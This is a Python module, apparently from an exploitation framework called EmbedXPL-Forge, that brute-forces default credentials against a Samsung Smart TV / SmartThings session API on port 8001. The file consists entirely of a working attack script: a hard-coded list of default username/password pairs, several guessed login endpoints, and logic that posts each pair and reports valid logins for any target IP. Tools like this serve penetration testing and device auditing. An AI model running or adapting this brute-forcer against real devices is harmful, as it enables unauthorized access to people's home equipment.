# Author: André Henrique (LinkedIn/X: @mrhenrike)
"""Samsung SmartThings / Tizen — Default Credential Brute-Forcer.

Attempts to authenticate to the Samsung Smart TV session API on port 8001
using a list of known default credential pairs. Reports any pair that
produces a successful authentication response.

CVE: N/A
CVSS: N/A
Version: 1.0.0
"""
import json
from typing import Optional

from embedxpl.core.exploit import *
from embedxpl.core.http.http_client import HTTPClient

_SESSION_PATHS = (
    "/api/v2/session",
    "/api/v2/auth",
    "/SmartView/auth",
    "/samsung/session",
    "/api/v2/login",
)

_DEFAULT_CREDS = (
    ("admin", "1234"),
    ("admin", "admin"),
    ("samsung", "samsung"),
    ("admin", "0000"),
    ("user", "1234"),
    ("root", "root"),
    ("admin", ""),
    ("samsung", ""),
)

_SUCCESS_INDICATORS = (
    "token",
    "sessionId",
    "access_token",
    '"result":"ok"',
    '"authorized"',
    '"success":true',
    "authenticated",
)
_FAILURE_INDICATORS = (
    "unauthorized",
    "invalid",
    "denied",
    "failed",
    "error",
    "wrong",
)


def _auth_succeeded(body: str, status: int) -> bool:
    """Determine whether a session response indicates successful authentication.

    Args:
        body: HTTP response body text.
        status: HTTP status code.

    Returns:
        True if success indicators are present and failure indicators are absent.
    """
    if status not in (200, 201, 302):
        return False
    body_lower = body.lower()
    if any(fail.lower() in body_lower for fail in _FAILURE_INDICATORS):
        return False
    return any(succ.lower() in body_lower for succ in _SUCCESS_INDICATORS)


class Exploit(HTTPClient):
    """Samsung SmartThings / Tizen Default Credential Brute-Forcer.

    Samsung Smart TVs and SmartThings hubs may expose a session API on port
    8001 that accepts username/password credentials. This module tries a curated
    list of well-known default credential pairs against the API and reports any
    that produce a successful authentication response.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Samsung SmartThings / Tizen Default Credential Brute-Forcer",
        "description": (
            "Attempts to authenticate to the Samsung Smart TV session API at "
            "port 8001 using known default credential pairs: admin:1234, "
            "admin:admin, samsung:samsung, and others. Reports successful logins."
        ),
        "authors": (
            "André Henrique (@mrhenrike) - EmbedXPL-Forge port",
        ),
        "references": (
            "https://developer.samsung.com/smarttv/develop/",
            "https://cve.mitre.org/cgi-bin/search-cgi.cgi?searchexpr=samsung+smarttv+auth",
        ),
        "devices": ("Samsung Smart TV",),
    }

    target = OptIP("", "Target IPv4 address")
    port = OptPort(8001, "Samsung Tizen REST API port")
    timeout = OptInteger(8, "HTTP request timeout (seconds)")

    def run(self) -> None:
        """Execute the default-credential login sweep."""
        print_status(
            "Attempting default credentials on {} (port {})".format(
                self.target, self.port
            )
        )
        found_any = False
        for username, password in _DEFAULT_CREDS:
            path = self._try_credentials(username, password)
            if path:
                found_any = True
                display_pass = password if password else "(empty)"
                print_success(
                    "VALID — {}:{} succeeded at {}".format(
                        username, display_pass, path
                    )
                )
            else:
                display_pass = password if password else "(empty)"
                print_status(
                    "  {}:{} — no match".format(username, display_pass)
                )
        if not found_any:
            print_error(
                "All default credential attempts failed — "
                "target does not appear to use default credentials."
            )

    def _try_credentials(self, username: str, password: str) -> Optional[str]:
        """Attempt to authenticate with the given credentials on all session paths.

        Args:
            username: Login username to try.
            password: Login password to try.

        Returns:
            The first path that accepted the credentials, or None.
        """
        body = json.dumps({"username": username, "password": password}).encode("utf-8")
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "EmbedXPL-Forge/1.0",
        }
        for path in _SESSION_PATHS:
            try:
                resp = self.http_request(
                    "POST",
                    path,
                    data=body,
                    headers=headers,
                    timeout=int(self.timeout),
                )
            except Exception:
                continue
            if resp is None:
                continue
            status = getattr(resp, "status_code", 0)
            resp_body = getattr(resp, "text", "") or ""
            if _auth_succeeded(resp_body, status):
                return path
        return None

    @mute
    def check(self) -> bool:
        """Check if any default credential pair authenticates successfully.

        Returns:
            True if at least one credential pair is accepted.
        """
        for username, password in _DEFAULT_CREDS:
            if self._try_credentials(username, password) is not None:
                return True
        return False
